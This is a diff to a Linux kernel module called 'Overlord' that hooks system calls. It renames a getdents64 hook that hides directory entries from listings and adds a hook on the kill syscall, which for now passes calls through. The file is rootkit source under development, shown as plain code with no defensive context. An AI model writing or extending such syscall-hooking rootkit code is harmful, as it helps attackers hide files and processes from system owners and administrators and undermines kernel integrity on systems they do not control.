@@ -28,7 +28,7 @@ static int is_dir_hidden(const char *name) {
     return 0;
 }
 
-asmlinkage long getdents64_hide(struct pt_regs *regs) {
+asmlinkage long hooked_getdents64(struct pt_regs *regs) {
     long size = (orig_syscall(__NR_getdents64))(regs);
     long nsize = size;
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user*)regs->si;
@@ -63,11 +63,17 @@ ret:
     return nsize;
 }
 
+asmlinkage long hooked_kill(struct pt_regs *regs) {
+    pid_t pid = (pid_t)regs->di;
+    int signal = (int)regs->si;
+    return (orig_syscall(__NR_kill))(regs);
+}
 
 static int __init overlord_init(void) {
     syscall_setup();
     printk(KERN_INFO "[Overlord] Hello World!\n");
-    hook_syscall(&getdents64_hide, __NR_getdents64);
+    hook_syscall(&hooked_getdents64, __NR_getdents64);
+    hook_syscall(&hooked_kill, __NR_kill);
     return 0;
 }
 
